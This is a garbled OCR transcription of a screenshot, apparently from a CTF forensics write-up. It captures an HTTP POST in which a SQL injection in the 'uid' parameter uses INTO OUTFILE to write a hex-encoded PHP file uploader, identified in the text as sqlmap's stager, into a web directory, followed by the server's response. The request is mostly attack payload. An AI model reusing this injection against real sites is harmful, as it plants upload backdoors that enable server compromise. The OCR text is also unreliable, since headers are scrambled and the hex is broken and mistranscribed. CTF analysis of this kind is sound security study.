@@ -1,0 +1,59 @@
+# OCR: 1d48e3692f2a1d1d20ba327c21fe862c.webp
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/1d48e3692f2a1d1d20ba327c21fe862c.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:14
+
++++++++++++++++++++++++++++++ HTTP request [17]:
+PosT /Home/User/tkpwdpost.html :
+HTTP/1.1
+Host:
+192.168.11.6
+Accept: application/json,text/javascript,*/*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-agent: Nozilla/5.0 (windows NT 10.0; Win64;
+x64) AppleWebkit/537.36
+Content-type: application/x-ww-form-urlencoded;
+http://192.168.11.6
+Origin:
+Referer:http://192.168.11.6/Home/User/tkppwd
+Accept-encoding: gzip, deflate Accept-1anguage: zh-cN, zhiq=0.9
+Cookie:PHpsEssID=unqvc7if2olqp31b8p92cukds5
+1570
+Content-length: Connection: close
+charset=UTE-8
+(KHTML, 1ike Gecko)
+Chrcme/91.0.4472.124 Safari/537.36
+pwd=1234566re_pwd=1234566uid=295329%20LINIT200%2c1920INT04200UTFILE%20827c93A2mphpstuty%2Fwww:2Ftmpums00.php%2720LINEs320TERMINATED920BY9200x3c3f7068700a69662028697373657428245f5245515545 53545b2275706c6f6164225d29297b246469723d245524551554553545b22
+75706c6f6164446972225d3b69662028706870766572736966e28293c27342e312e30272
+5454505f504f53545f46494c45535b226669
+6c65225d5b226e616d65225d3b406d6f76655f 7d656c73657b2466696c653d245f46494c45535b2
+696c6529206f722064696528293b7d4063686d6f64282
+45525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747 Sa452076616c75653d313030303030303030303e3c623e
+246696c652075706c61616465642
+73716c6d61702066696c65207570661616465723c2162383c62
+203c696e70757420747970653d7465787
+2068616d653
+653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a HTTP response[#7](200OK):
+Date: Wed,22May 2024 04:08:08 GHT
+706c61616444
+Server: Apache/2.4.23 (win32)openssL/1.0.2j mod_fcgid/2.3.9 XPowered-By:PHP/5.6.27
+19NoV198108:52:00GMT
+Expires:Thu,
+Cache-Control: no-store, no-cache, must-revalidate,
+Pragma: no-cache Connection: close
+chunked
+Transfer-Encoding:
+Content-Type: text/html;charset=utf-s
+URI:http://192.168.11.6/Home/User/tkpwdpost.html
+6616
+pre-check=0
+post-check=0,
++++#+#+#+#+#####++++*++++++#+++#+#+++#++##++#++++++++++++###+#+#
+c3e203c6
+28293b 2e2466
+26d206163746961693d222e245t53
+0653d68696464656e206e616d653d4d41585f46494c4555349 970653d66696c653e3c62723e746f206469726563746f72793a
+6e616d653d7
+706c61616420
+76616c75
